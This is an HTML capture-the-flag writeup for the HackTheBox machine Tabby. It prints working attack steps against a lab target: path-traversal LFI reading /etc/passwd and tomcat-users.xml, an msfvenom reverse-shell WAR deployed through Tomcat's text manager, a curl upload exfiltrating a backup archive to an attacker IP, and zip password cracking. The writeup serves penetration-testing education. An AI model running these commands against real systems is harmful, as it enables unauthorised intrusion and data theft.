@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tabby &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Tabby</h1>
+    <div class="meta">Target: <code>10.10.14.58</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">LFI</span><span class="tag">Tomcat</span><span class="tag">WAR</span><span class="tag">john</span><span class="tag">zip2john</span><span class="tag">PasswordReuse</span><span class="tag">lxd</span><span class="tag">ContainerEscape</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#lfi-discovery">LFI Discovery</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#leaking-tomcat-credentials-via-lfi">Leaking Tomcat Credentials via LFI</a><a class="lvl3" href="#war-deployment-via-tomcat-text-manager">WAR Deployment via Tomcat Text Manager</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#zip-archive-ash">ZIP Archive → ash</a><a class="lvl3" href="#lxd-group-in-progress">lxd Group (In Progress)</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Tabby is an easy Linux box running Apache and Tomcat in parallel. An LFI in a news page leaks the Tomcat <code>tomcat-users.xml</code> credential file. Those credentials allow WAR deployment via Tomcat's text manager, giving a shell as the <code>tomcat</code> user. A password-protected ZIP archive in the webroot cracks with <code>zip2john</code>, and the password reuses to <code>su ash</code>. Ash is in the <code>lxd</code> group, which is the vector for the privilege escalation.</p>
+<blockquote>
+<p><strong>Note:</strong> the notes document the lxd escalation path as far as identifying the container image build requirement (Alpine Linux via lxd-alpine-builder) but do not include the execution steps. The writeup covers what is documented; the lxd container escape is written as in-progress.</p>
+</blockquote>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp   open  http    Apache httpd 2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+</code></pre>
+<p>Adding the FQDN to <code>/etc/hosts</code>:</p>
+<pre><code>megahosting.htb
+</code></pre>
+<h3 id="lfi-discovery">LFI Discovery</h3>
+<p>Port 80's <code>news.php</code> page calls files via a <code>file</code> parameter. Testing path traversal confirms LFI:</p>
+<pre><code class="language-sh">http://megahosting.htb/news.php?file=../../../../../etc/passwd
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="leaking-tomcat-credentials-via-lfi">Leaking Tomcat Credentials via LFI</h3>
+<p>Tomcat stores its user/role configuration in <code>tomcat-users.xml</code>. The default path for the Ubuntu <code>tomcat9</code> package is <code>/usr/share/tomcat9/etc/tomcat-users.xml</code>:</p>
+<pre><code class="language-sh">view-source:http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
+</code></pre>
+<p>Credentials extracted:</p>
+<pre><code class="language-sh">tomcat:‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Why this works:</strong> Tomcat's text manager (<code>/manager/text</code>) is accessible without a browser and allows WAR deployment over HTTP. The GUI manager is often locked to specific IP ranges, but the text endpoint uses the same credential check and is frequently left open. LFI is the key to finding the credential file when it isn't in a default guessable location.</p>
+</blockquote>
+<h3 id="war-deployment-via-tomcat-text-manager">WAR Deployment via Tomcat Text Manager</h3>
+<p>The text manager lists running apps:</p>
+<pre><code>http://megahosting.htb:8080/manager/text/list
+</code></pre>
+<p>Generate a reverse shell WAR with msfvenom:</p>
+<pre><code class="language-sh">msfvenom -p java/shell_reverse_tcp lhost=10.10.14.58 lport=53 -f war -o rev.war
+</code></pre>
+<p>Deploy via cURL with the recovered credentials:</p>
+<pre><code class="language-sh">curl -u 'tomcat:‹redacted›' http://10.129.154.37:8080/manager/text/deploy?path=/tester --upload-file rev.war
+OK - Deployed application at context path [/tester]
+</code></pre>
+<p>Trigger the payload:</p>
+<pre><code class="language-sh">curl http://10.129.154.37:8080/tester
+</code></pre>
+<p>Shell received:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+whoami
+tomcat
+</code></pre>
+<p>Upgrade to TTY:</p>
+<pre><code class="language-python">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="zip-archive-ash">ZIP Archive → ash</h3>
+<p>A backup archive lives in <code>/var/www/html/files/</code>. Exfiltrate it to the attacker machine:</p>
+<pre><code class="language-sh">curl -F 'file=@/var/www/html/files/16162020_backup.zip' http://10.10.14.158:8000/
+</code></pre>
+<p>Convert the password-protected ZIP to a john-crackable hash:</p>
+<pre><code class="language-sh">zip2john 16162020_backup.zip &gt; johnzip
+john johnzip --wordlist=/usr/share/wordlists/rockyou.txt
+‹redacted›         (16162020_backup.zip)
+</code></pre>
+<p>The archive contents aren't useful, but the password reuses for <code>su</code>:</p>
+<pre><code class="language-sh">tomcat@tabby:/var/www/html/files$ su ash
+Password: ‹redacted›
+
+ash@tabby:~$
+</code></pre>
+<p>User flag obtained from <code>ash</code>'s home directory.</p>
+<h3 id="lxd-group-in-progress">lxd Group (In Progress)</h3>
+<p>Ash is a member of the <code>lxd</code> group:</p>
+<pre><code>uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+</code></pre>
+<pre><code class="language-sh">ash@tabby:/snap/bin$ ./lxc list
+[empty container list]
+</code></pre>
+<p>The container host has no images. The path requires building an Alpine Linux image using the <code>lxd-alpine-builder</code> project (https://github.com/saghul/lxd-alpine-builder), importing it into lxd, creating a privileged container with the host root filesystem mounted inside, and using it to read or write the host as root.</p>
+<blockquote>
+<p><strong>Note:</strong> these notes are incomplete, the lxd container import and root filesystem mount steps are not documented; written as in-progress.</p>
+</blockquote>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>LFI + known config file paths = credential recovery.</strong> <code>tomcat-users.xml</code> is in a predictable location on Debian/Ubuntu packages; LFI is enough to read it.</li>
+<li><strong>The Tomcat text manager is a WAR deployment endpoint that survives even when the GUI is restricted.</strong> Always check <code>/manager/text/</code> with any Tomcat credentials found.</li>
+<li><strong>Password reuse between a ZIP archive and system accounts is common.</strong> Crack every archive found in webroot directories.</li>
+<li><strong>lxd group membership is equivalent to root.</strong> Any user who can manage LXD containers can mount the host filesystem inside a privileged container.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
